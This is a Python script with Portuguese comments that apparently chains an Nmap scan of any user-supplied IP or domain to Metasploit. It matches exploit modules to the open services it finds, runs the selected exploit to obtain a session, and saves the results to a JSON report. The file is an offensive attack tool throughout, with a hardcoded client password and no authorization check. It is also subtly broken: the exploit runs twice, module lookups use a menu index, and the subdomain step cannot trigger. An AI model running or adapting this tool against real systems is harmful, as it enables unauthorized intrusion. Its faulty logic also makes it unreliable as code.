import json
from metasploit import MetasploitClient
from metasploit.nmap_integration import NmapScanner  # Substitua pelo caminho correto do seu módulo
import socket

# Inicialize o cliente do Metasploit
metasploit_client = MetasploitClient("senhasenha")

# Obtenha a lista de exploits disponíveis
exploits = metasploit_client.list_exploits()

def main():
    # Inicializa o scanner Nmap
    scanner = NmapScanner()

    # Solicita o alvo (IP ou URL)
    alvo = input("Digite o alvo (IP ou URL): ")

    # Verifica se o alvo é um nome de domínio e resolve para IP
    if "." in alvo and not alvo.replace(".", "").isdigit():  # Verifica se é uma URL
        ip = MetasploitClient.resolver_dominio(alvo)
        if not ip:
            print(f"Não foi possível resolver o domínio {alvo}.")
            return
        print(f"Domínio {alvo} resolvido para IP: {ip}")
        alvo = ip  # Usa o IP resolvido para o scan

    # Realiza o scan com Nmap
    print(f"\nIniciando scan no alvo: {alvo}")
    scan_result = scanner.scanner.scan(alvo, arguments='-sT')  # Scan de versão e SO

    # Verifica se o scan foi bem-sucedido
    if alvo not in scanner.scanner.all_hosts():
        print(f"Erro: O alvo {alvo} não foi escaneado ou não foi encontrado.")
        return

    # Obtém informações do scan
    print("\nInformações do scan:")
    for host in scanner.scanner.all_hosts():
        print(f"Host: {host}")
        print(f"Estado: {scanner.scanner[host]['status']['state']}")
        for proto in scanner.scanner[host].all_protocols():
            print(f"Protocolo: {proto}")
            for port in scanner.scanner[host][proto]:
                print(f"Porta: {port} / Estado: {scanner.scanner[host][proto][port]['state']} / Serviço: {scanner.scanner[host][proto][port]['name']}")

    # Lista as portas abertas
    print("\nPortas abertas:")
    open_ports = scanner.list_open_ports(alvo)
    for port in open_ports:
        print(f"Porta {port} está aberta.")

    # Preenche o dicionário PAYLOADS com os exploits disponíveis
    servicos_escaneados = {}
    for host in scanner.scanner.all_hosts():
        for proto in scanner.scanner[host].all_protocols():
            for port in scanner.scanner[host][proto]:
                service_info = scanner.scanner[host][proto][port]
                servicos_escaneados[port] = service_info

    # Obtém os payloads dinamicamente
    exploits = metasploit_client.list_exploits()
    PAYLOADS = {}
    for port, service_info in servicos_escaneados.items():
        service_name = service_info.get('name', '').lower()
        PAYLOADS[port] = []
        for exploit in exploits:
            if service_name in exploit.lower():
                # Adiciona o payload à lista (sem pré-carregar as opções)
                PAYLOADS[port].append({
                    "nome": exploit,
                })


    # Loop para escolher portas e payloads
    resultados_exploracao = []
    while True:
        try:
            porta_escolhida = int(
                input("\nDigite o número de uma porta para obter mais informações (ou 0 para sair): "))
            if porta_escolhida == 0:
                break

            # Obtém informações sobre a porta escolhida
            try:
                service_info = scanner.get_service_info(alvo, porta_escolhida)
                print(f"\nInformações sobre a porta {porta_escolhida}:")
                print(json.dumps(service_info, indent=4))

                # Lista os payloads disponíveis para a porta
                MetasploitClient.listar_payloads(porta_escolhida, PAYLOADS)

                # Pergunta se o usuário deseja escolher um payload
                escolha = input("\nDeseja escolher um payload para esta porta? (s/n): ").strip().lower()
                if escolha == 's':
                    print("\nEscolha um payload para prosseguir:")
                    for i, payload in enumerate(PAYLOADS.get(porta_escolhida, []), 1):
                        print(f"{i}. {payload['nome']}")
                    payload_escolhido = int(input("\nDigite o número do payload: "))
                    payload = PAYLOADS[porta_escolhida][payload_escolhido - 1]

                    # Configura as opções do payload
                    opcoes_configuradas = MetasploitClient.configurar_payload(metasploit_client.client, payload["nome"])

                    if opcoes_configuradas:
                        # Executa o exploit (se for um exploit)
                        if payload_escolhido in metasploit_client.client.modules.exploits:
                            session_id = metasploit_client.run_exploit(payload_escolhido, opcoes_configuradas)
                            if session_id:
                                print(f"Sessão criada: {session_id}")
                            else:
                                print("Falha ao executar o exploit.")
                        elif payload_escolhido in metasploit_client.client.modules.payloads:
                            print("Payload configurado com sucesso.")
                        else:
                            print("Módulo não encontrado.")
                    else:
                        print("Erro: Nenhuma opção foi configurada.")

                    # Executa o exploit usando a função run_exploit
                    exploit_name = payload["nome"]
                    print(f"\nExecutando exploit {exploit_name}...")
                    session_id = metasploit_client.run_exploit(exploit_name, opcoes_configuradas)

                    # Salva o resultado da exploração
                    resultados_exploracao.append({
                        "porta": porta_escolhida,
                        "exploit": exploit_name,
                        "opcoes_configuradas": opcoes_configuradas,
                        "session_id": session_id,
                    })
            except ValueError as e:
                print(e)
        except ValueError:
            print("Entrada inválida. Digite um número de porta válido.")

    # Mapeia subdomínios (se for uma URL)
    if "." in alvo and not alvo.replace(".", "").isdigit():  # Verifica se é uma URL
        arquivo_subdominios = input("\nDigite o caminho do arquivo de subdomínios (ou pressione Enter para pular): ")
        if arquivo_subdominios:
            print("\nMapeando subdomínios...")
            resultados_subdominios = scanner.mapear_subdominios(alvo, arquivo_subdominios)
            print(json.dumps(resultados_subdominios, indent=4))

    # Salva os resultados em um arquivo JSON
    relatorio = {
        "alvo": alvo,
        "portas_abertas": open_ports,
        "servicos": {port: scanner.get_service_info(alvo, port) for port in open_ports},
        "subdominios": resultados_subdominios if 'resultados_subdominios' in locals() else None,
        "exploracao": resultados_exploracao,
    }

    with open("relatorio_scan.json", "w") as f:
        json.dump(relatorio, f, indent=4)
    print("\nRelatório salvo em 'relatorio_scan.json'.")

if __name__ == "__main__":
    main()